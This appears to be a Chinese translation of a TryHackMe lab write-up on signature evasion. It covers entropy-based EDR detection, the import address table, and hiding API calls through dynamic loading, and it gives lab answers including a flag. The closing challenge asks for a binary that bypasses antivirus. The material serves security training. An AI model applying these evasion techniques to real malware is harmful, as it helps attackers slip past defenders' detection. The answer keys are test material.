TF8i5tYltii9qCx9qbVQmL5My9KdovSwLH15R1l6WJi+wnq7eodTlF5Ulr5Ky9JXWQuF6U5ReliW/oSWpauFwvQ1xWXpkxq1LL2xoyw9LExfay2Upa8TM32dLUovKktfby0Upm/QsnSnKD0sS9/oTfQ2WYPCdLcsPShKLypLb9LC9CZroSzdKUoPy9K3alm6WihLz+mO3j6nKD0qSy8qTN/rlaXv07L0fR1l6WFh+n5roSzdKUoPy9IPlt7R+7JTlB6WpR/qKEsPC9MPWwtl6S0dRelFZemtVnr06NFjRw8AoBfu6NGjl9MdvSDwTe8Ie+9T3++GvZliblDdwPfBWU7QU29Ub4oJfPTo0aNHjx49evTosaNHjx4AQC3u6NGjR48ePXr06NGjR48ePXr06LGjBwBQLfTo0aNHjx49evTo0aNHjx47ejnZ0aNHDwAgK+jRo0ePHj169OjRy9uO3v6kHb298Tt6rV20o/dMV+7otVmfbZOOI5tHvIleu5gfHRHz43YxP2kX85z6/FHrC+pP1RePWV86JuZnx8T8/Lj1F+rLJ8S8fFzMKyesvzwhYcA7+bTQo0ePXucqFiZ7FQsPF1UsXJfZ0zUAgJ68o0ePXk539OjRo0ePHj169OjRo0evpxWl06MHADA2Xzt69OjRo0ePHj169OjRo0ePHj167OgBAFQLPXr06NGjR48ePXr06NGjx45eTnb06NEDAMgKevTo0aNHjx49evTytqNHj178jt5PumBH75ed3dFrV4+obWqrY4sYc9iRHj169AAAeuOOHj16Od3Ro0fP7ug5pelhcbpaVJreoIXpDWJuCUrTF4u5VXWL0z+vxelhYboalqbTo0ePHj169OjRo9fzd/R4MRYAyAc529GjR48ePXr06NGjR48ePXr06NFjRw8AoFro0aNHjx49evTo0aNHjx49dvRysqNHjx4AQFbQo0ePHj169OjRo5e3HT169OjRC49w7lX3qLvVXepOtVndoT7puF3dpm5Vt6hNKj169OgBQK2Rnx09evRyuqNHjx49evTo0aNHjx49evTopd/Rs2XpFKYDQHeTsx09evTo0aNHjx49evTo0aNHjx49dvQAAKqFHj169OjRo0ePHj169OjRY0cvJzt69OgBAGQFPXr06NGjR48ePXp529GjR48evUx39KL9PHb0sq9YmOwd36ReAQDyQ3529OjRy+mOHj169Ojpjt7kwEYxU9SpjWKmrRUzrVHMI2ut09UZ68TMVGcFrhcze72YR9U56twN1nnq/I1i3OObC9XHN1kXqQ2bxSxWl6hLN4tZ1mRdrq7YImZFk5iVW8SsUldvEfPEVuuaMhO9KOxtVN2w5we+QtjbIWa7Goa9IOipzU7g26WBb/dOG/QKYW9XcdgLPLBbzMHAPWKe2iPmkHp4r7VFbVXb9ok5sk9Mu3p0v/WYelw9ccD6dCcneoFfPSTma+rXD1u/oX6zxfqtFjHfDmwV850WMd9ttX5PfbbN+n31B21ifthmy9LDwnTVLU2PitNfaO8oTX9RfckpTQ+L09WwNF195bhTmK4Gpem/OpFRYXqLV5h+yCtMP6geUPer9OjRowcAUJM7evTo0aNHjx49evTo0aNHjx49euzoAQBUCz169OjRo0ePHj169OjRo8eOXk529OjRAwDICnr06NGjR48ePXr08rajR48ePXr06GV0hHOuOkdlRw8Aeg9jc7OjR49eTnf06NGjR48ePXr06NFjR48ePXr0AKCnkbMdPXr06NGjR48ePXr06NGjR48ePSZ6AADVQo8ePXr06NGjR48ePXr06LGjl5MdPXr0AACygh49evTo0aNHjx69vO3o0aNHjx49euzoAQDUzI4ePXo53dGjR48ePXr06NGjR48dPXb00u/oBU4Mva76J1gAALWyo0ePHj169OjRo0ePHj169OjRo8dEDwCgWujRo0ePHj169OjRo0ePHj129HKyo0ePHgBAVtCjR48ePXr06NGjl7cdPXr06NGjR48dPQCAmtnRo0cvpzt69OjRo0ePHj169Oixo8eOHj16ANDTyNmOHj169OjRo0ePHj169OjRo0ePHhM9AIBqoUePHj169OjRo0ePHj169NjRy8mOHj16AABZQY8ePXr06NGjR49e3nb06NGjR48ePXb0AABqZkePHr2c7ujRo0ePHj169OjRo8eOHjt69OgBQE8jZzt69OjRo0ePHj169OjRo0ePHj16TPQAAKqFHj169OjRo0ePHj169OjRY0cvJzt69OgBAGQFPXr06NGjR48ePXp529GjR48ePXr02NEDAKiZHT169HK6o0ePHj169OjRo0ePHjt67OjRowcAPY2c7ejRo0ePHj169OjRo0ePHj169Ogx0QMAqBZ6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" width="890" height="108" class="img_ev3q">**</p>
<p>根据使用的 EDR，&quot;可疑&quot;的熵值通常为 <strong>大于 6.8</strong>。</p>
<p>随着文件变大以及更多出现的情况，随机值与英文文本之间的差异会变得更加明显。</p>
<p>需要注意的是，熵通常不会单独使用，而是用于支持假设。例如，命令 <code>pskill</code> 和 hivenightmare 漏洞的熵值几乎相同。</p>
<p>为了展示熵的实际应用，让我们看看 EDR 如何利用它来为威胁指标提供支持。</p>
<p>在白皮书 <a href="https://www.mdpi.com/2624-800X/1/3/21/pdf" target="_blank" rel="noopener noreferrer">《对抗高级持续性威胁攻击向量的端点检测与响应系统的实证评估》</a> 中，<strong>SentinelOne</strong> 被展示为因 AES 加密导致高熵而检测到 DLL。</p>
<div class="theme-admonition theme-admonition-info admonition_xJq3 alert alert--info"><div class="admonitionHeading_Gvgb"><span class="admonitionIcon_Rf37"><svg viewBox="0 0 14 16"><path fill-rule="evenodd" d="M7 2.3c3.14 0 5.7 2.56 5.7 5.7s-2.56 5.7-5.7 5.7A5.71 5.71 0 0 1 1.3 8c0-3.14 2.56-5.7 5.7-5.7zM7 1C3.14 1 0 4.14 0 8s3.14 7 7 7 7-3.14 7-7-3.14-7-7-7zm1 3H6v5h2V4zm0 6H6v2h2v-2z"></path></svg></span>Answer the questions below</div><div class="admonitionContent_BuS1"><p>使用 CyberChef，获取文件的香农熵值：<code>C:\Users\Student\Desktop\Binaries\shell.exe</code></p><p>将香农熵值四舍五入到三位小数，文件的香农熵是多少？</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">6.354</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div></div></div>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="behavioral-signatures---行为签名">Behavioral Signatures - 行为签名<a href="#behavioral-signatures---行为签名" class="hash-link" aria-label="Direct link to Behavioral Signatures - 行为签名" title="Direct link to Behavioral Signatures - 行为签名">​</a></h2>
<p>混淆函数和属性可以通过最小的修改实现大量效果。即使在打破附加到文件的静态签名之后，现代引擎仍然可能会观察到二进制文件的行为和功能。这给攻击者带来了许多问题，而这些问题无法通过简单的混淆来解决。</p>
<p>正如在 <a href="https://tryhackme.com/room/introtoav" target="_blank" rel="noopener noreferrer">《防病毒简介》</a> 中所讨论的，现代反病毒引擎通常采用两种方法来检测行为：观察导入和钩取已知的恶意调用。虽然导入，如本任务中所讲，可以通过简单的混淆或修改轻松解决，但钩取则需要更复杂的技术，这超出了本任务的范围。由于特别是 API 调用的普遍存在，观察这些函数可以成为判断文件是否可疑的重要因素，连同其他行为测试和考量。</p>
<p>在深入讨论重写或导入调用之前，让我们先讨论一下 API 调用通常是如何被利用和导入的。我们将首先覆盖基于 C 的语言，然后在本任务的后面简要介绍基于 .NET 的语言。</p>
<p>API 调用和操作系统本地的其他函数需要一个指向函数地址的指针和一个结构体来利用它们。</p>
<p>函数的结构体很简单，它们位于 <strong>导入库</strong> 中，例如 <code>kernel32</code> 或 <code>ntdll</code>，这些库存储了 Windows 的函数结构体和其他核心信息。</p>
<p>导入函数的最大问题是函数地址。获取指针看起来似乎很直接，然而由于 <strong>ASLR</strong>（<strong>A</strong>ddress <strong>S</strong>pace <strong>L</strong>ayout <strong>R</strong>andomization，地址空间布局随机化），函数地址是动态的，必须找到。</p>
<p>与其在运行时修改代码，不如使用 <strong>Windows 加载器</strong> <code>windows.h</code>。在运行时，加载器将所有模块映射到进程地址空间，并列出每个模块的所有函数。这处理了模块，但函数地址是如何分配的呢？</p>
<p>Windows 加载器最关键的功能之一是 <strong>IAT（I</strong>mport <strong>A</strong>ddress <strong>T</strong>able，导入地址表）**。IAT 将存储所有导入函数的函数地址，可以为函数分配指针。</p>
<p>IAT 存储在 <strong>PE</strong>（<strong>P</strong>ortable <strong>E</strong>xecutable，便携式可执行文件）头部的 <code>IMAGE_OPTIONAL_HEADER</code> 中，并在运行时由 Windows 加载器填充。Windows 加载器从指针表中获取函数地址，或更准确地说，是从一个 API 调用或 <strong>thunk 表</strong> 中访问 <strong>thunks</strong>。欲了解更多有关 PE 结构的信息，请查看 <a href="https://tryhackme.com/room/windowsinternals" target="_blank" rel="noopener noreferrer">Windows 内部原理</a> 任务。</p>
<p>简而言之，API 会被分配一个指向 thunk 的指针，作为函数地址，来自 Windows 加载器。为了让这个概念更具实际意义，我们可以观察一个函数的 PE 转储示例。</p>
<p><img decoding="async" loading="lazy" alt="Image of DiE showing the IAT table of a binary" src="/assets/images/0d4ba9ba4348b53036cb2127f4968e87-0fd14f087bd8ac4fd6a702031eb55361.png" width="705" height="634" class="img_ev3q"></p>
<hr>
<p>导入表可以提供关于二进制文件功能的很多有价值的信息，这对攻击者来说可能是有害的。那么，如何防止我们的函数出现在 IAT 中呢，尤其是在需要分配函数地址的情况下？</p>
<p>如前所述，thunk 表并不是获取函数地址指针的唯一方式。我们还可以利用 API 调用从导入库本身获取函数地址。这种技术被称为 <strong>动态加载</strong>，可以用来避免 IAT 并最小化 Windows 加载器的使用。</p>
<p>我们将编写结构并为函数创建新的任意名称，以便使用动态加载。</p>
<p>在高层次上，我们可以将 C 语言中的动态加载分为四个步骤：</p>
<ol>
<li>定义调用的结构</li>
<li>获取包含调用地址的模块的句柄</li>
<li>获取调用的进程地址</li>
<li>使用新创建的调用</li>
</ol>
<p>要开始动态加载 API 调用，我们必须首先在主函数之前定义调用的结构。调用结构将定义调用所需的任何输入或输出。我们可以在 Microsoft 文档中找到特定调用的结构。例如，<code>GetComputerNameA</code> 的结构可以在 <a href="https://docs.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-getcomputernamea" target="_blank" rel="noopener noreferrer">此处</a> 找到。因为我们在 C 语言中实现它作为一个新调用，语法需要稍作修改，但结构保持不变，如下所示。</p>
<div class="language-cpp codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-cpp codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token comment" style="color:#999988;font-style:italic">// 1. 定义调用的结构</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">typedef</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">BOOL</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">WINAPI</span><span class="token operator" style="color:#393A34">*</span><span class="token plain"> myNotGetComputerNameA</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">	LPSTR   lpBuffer</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">	LPDWORD nSize</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>要访问 API 调用的地址，我们必须首先加载定义该调用的库。我们将在主函数中定义这个库。对于任何 Windows API 调用，这通常是 <code>kernel32.dll</code> 或 <code>ntdll.dll</code>。以下是将库加载到模块句柄中的语法示例。</p>
<div class="language-cpp codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-cpp codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token comment" style="color:#999988;font-style:italic">// 2.获取包含调用地址的模块句柄</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">HMODULE hkernel32 </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">LoadLibraryA</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">&quot;kernel32.dll&quot;</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>使用先前加载的模块，我们可以获得指定 API 调用的进程地址。这将在 <code>LoadLibrary</code> 调用之后直接进行。我们可以通过将其与先前定义的结构一起转换来存储该调用。以下是获取 API 调用所需的语法示例。</p>
<div class="language-c codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-c codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token comment" style="color:#999988;font-style:italic">// 3. 获取调用的进程地址</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">myNotGetComputerNameA notGetComputerNameA </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">myNotGetComputerNameA</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">GetProcAddress</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">hkernel32</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&quot;GetComputerNameA&quot;</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>虽然这种方法解决了许多问题和顾虑，但仍有几个注意事项需要特别提及。首先，<code>GetProcAddress</code> 和 <code>LoadLibraryA</code> 仍然出现在 IAT 中，尽管它们不是直接的指示符，但它们可能引起怀疑并加强监测；这个问题可以通过使用 <strong>PIC</strong>（<strong>P</strong>osition <strong>I</strong>ndependent <strong>C</strong>ode）来解决。现代的安全工具也会挂钩特定的函数并监视内核交互；这个问题可以通过使用 <strong>API unhooking</strong> 来解决。</p>
<hr>
<p>根据你在整个任务中积累的知识，对以下 C 代码片段进行混淆，确保 IAT 中不出现可疑的 API 调用。</p>
<div class="language-c codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-c codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token macro property directive-hash" style="color:#36acaa">#</span><span class="token macro property directive keyword" style="color:#00009f">include</span><span class="token macro property" style="color:#36acaa"> </span><span class="token macro property string" style="color:#e3116c">&lt;windows.h&gt;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token macro property directive-hash" style="color:#36acaa">#</span><span class="token macro property directive keyword" style="color:#00009f">include</span><span class="token macro property" style="color:#36acaa"> </span><span class="token macro property string" style="color:#e3116c">&lt;stdio.h&gt;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token macro property directive-hash" style="color:#36acaa">#</span><span class="token macro property directive keyword" style="color:#00009f">include</span><span class="token macro property" style="color:#36acaa"> </span><span class="token macro property string" style="color:#e3116c">&lt;lm.h&gt;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">int</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">main</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token function" style="color:#d73a49">printf</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">&quot;GetComputerNameA: 0x%p\\n&quot;</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> GetComputerNameA</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    CHAR hostName</span><span class="token punctuation" style="color:#393A34">[</span><span class="token number" style="color:#36acaa">260</span><span class="token punctuation" style="color:#393A34">]</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    DWORD hostNameLength </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">260</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token keyword" style="color:#00009f">if</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token function" style="color:#d73a49">GetComputerNameA</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">hostName</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">&amp;</span><span class="token plain">hostNameLength</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token function" style="color:#d73a49">printf</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">&quot;hostname: %s\\n&quot;</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> hostName</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token punctuation" style="color:#393A34">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">}</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>一旦代码足够混淆，将代码片段提交到位于 <code>http://10.10.236.58/challenge-2.html</code> 的 Web 服务器。文件名必须保存为 <code>challenge-2.exe</code>。如果混淆正确，将在警告弹窗中显示一个标志。</p>
<div class="theme-admonition theme-admonition-info admonition_xJq3 alert alert--info"><div class="admonitionHeading_Gvgb"><span class="admonitionIcon_Rf37"><svg viewBox="0 0 14 16"><path fill-rule="evenodd" d="M7 2.3c3.14 0 5.7 2.56 5.7 5.7s-2.56 5.7-5.7 5.7A5.71 5.71 0 0 1 1.3 8c0-3.14 2.56-5.7 5.7-5.7zM7 1C3.14 1 0 4.14 0 8s3.14 7 7 7 7-3.14 7-7-3.14-7-7-7zm1 3H6v5h2V4zm0 6H6v2h2v-2z"></path></svg></span>Answer the questions below</div><div class="admonitionContent_BuS1"><p>上传正确混淆的代码片段后，会找到什么标志？</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">THM{N0_1MP0r75_F0r_Y0U}</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div></div></div>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="putting-it-all-together---将所有内容整合在一起">Putting It All Together - 将所有内容整合在一起<a href="#putting-it-all-together---将所有内容整合在一起" class="hash-link" aria-label="Direct link to Putting It All Together - 将所有内容整合在一起" title="Direct link to Putting It All Together - 将所有内容整合在一起">​</a></h2>
<p>如同在本房间和<a href="https://tryhackme.com/room/obfuscationprinciples" target="_blank" rel="noopener noreferrer">混淆原理</a>中反复强调的那样，没有任何一种方法是 100% 有效或可靠的。</p>
<p>为了创建一种更有效和可靠的方法论，我们可以结合本房间和前面提到的几种方法。</p>
<p>在决定混淆顺序时，考虑每种方法的影响。例如，混淆一个已经损坏的类是否比混淆一个未损坏的类更容易，或者混淆一个类后再破坏它是否更容易？</p>
<p>注意：通常，在进行具体的签名破坏后，应该运行自动化混淆或不那么具体的混淆方法，但在此挑战中，您不需要使用这些技术。</p>
<p>考虑到这些注意事项，请根据以下要求修改提供的二进制文件：</p>
<ol>
<li>不得存在可疑的库调用。</li>
<li>不得泄露函数或变量名称。</li>
<li>文件哈希值与原始哈希值不同。</li>
<li>二进制文件能够绕过常见的防病毒引擎。</li>
</ol>
<p>注意：在考虑库调用和泄露的函数时，要特别留意二进制文件的 IAT 表和字符串。</p>
